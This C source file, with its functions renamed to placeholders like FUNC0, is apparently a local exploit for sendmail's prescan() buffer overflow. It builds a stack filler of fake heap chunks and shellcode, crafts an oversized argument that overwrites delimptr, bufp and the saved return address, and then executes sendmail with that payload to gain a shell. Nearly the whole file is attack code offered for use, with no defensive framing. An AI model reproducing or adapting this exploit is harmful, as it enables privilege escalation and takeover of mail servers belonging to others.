#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct target_info {int stack_len; int distance; size_t ebp; size_t delimptr; size_t pvpbuf; int zero; size_t al; size_t e; size_t bufp; int chunk; int ret; int /*<<< orphan*/  sendmail; } ;

/* Variables and functions */
 int /*<<< orphan*/  SIGKILL ; 
 scalar_t__ FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char**,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 int FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (int*) ; 

int FUNC13(struct target_info target) {
	char *stackfiller=0;	/* data to lower stack (we can put fake chunks and shellcode here) */
	char egg[1024*3];	/* the argment to prescan() */
	char *ptr;
	int  *ptr2;
	int i;
	int pid;
	char *arg[] = { "owned",egg,stackfiller,NULL};


	

	/* prepare stack filler */
	stackfiller = (char*) FUNC6(target.stack_len);
	if(!stackfiller) {
		FUNC9("malloc()");
		FUNC2(0);
	}
	
	FUNC8(stackfiller,'A',target.stack_len);
	*(stackfiller+target.stack_len-1) = 0;

	ptr = stackfiller;
	
        while(1) {
		/* fake chunk */
	        char *chunk = 	"\xfc\xff\xff\xff"
	        		"\xfc\xff\xff\xff"
	        		"\xa1\xff\xff\xbf"
	        		"\xa1\xff\xff\xbf"	/* yes unlink will overwrite 0xbfffffa1+12 ... but who cares */
	        		"\xa1\xff\xff\xbf";
	        		
                FUNC7(ptr,chunk,FUNC11(chunk));
	        ptr += FUNC11(chunk);
	                                                       
	        if(ptr + FUNC11(chunk) >= stackfiller+target.stack_len-1)
	                break;
	}
	FUNC7(stackfiller,shellcode,FUNC11(shellcode));
	arg[2] = stackfiller;		                                                                                                        



	/* prepare egg */
	FUNC8(egg,'A',1200);
	egg[1200] = 0;
	
        for(i=0; i < target.distance - 1200; i++) 
	        FUNC10(egg,"\xff\\");
	                                	
        /* set delimptr */
        ptr2 = (int*) &egg[target.ebp+target.delimptr-target.pvpbuf];
        *ptr2 = target.zero;

        /* set al  */
        ptr2 = (int*) &egg[target.ebp+target.al-target.pvpbuf];
	*ptr2 = target.zero-11*4;
	
        /* set e  */
        ptr2 = (int*) &egg[target.ebp+target.e-target.pvpbuf];
	*ptr2 = target.zero;
	
	
        /* set bufp */
        ptr2 = (int*) &egg[target.ebp+target.bufp-target.pvpbuf];
	*ptr2 = target.chunk;
	
	/* set ret ebp + 4 */
	ptr2 = (int*) &egg[target.ebp+4-target.pvpbuf];
	*ptr2 = target.ret;
	
	
		        
		

	/* execute program */
	pid = FUNC3();
	if(pid == -1) {
		FUNC9("fork()");
		FUNC2(-1);
	}
	
	/* child */
	if(pid==0) {
		FUNC1(target.sendmail,arg,NULL);
		FUNC9("execve()");
		FUNC5(FUNC4(),SIGKILL);
		FUNC2(0);
	}
	else {
		int status;
		FUNC12(&status);
		
		if(FUNC0(status) == 0)
			return 0;
		return 1;
	}
}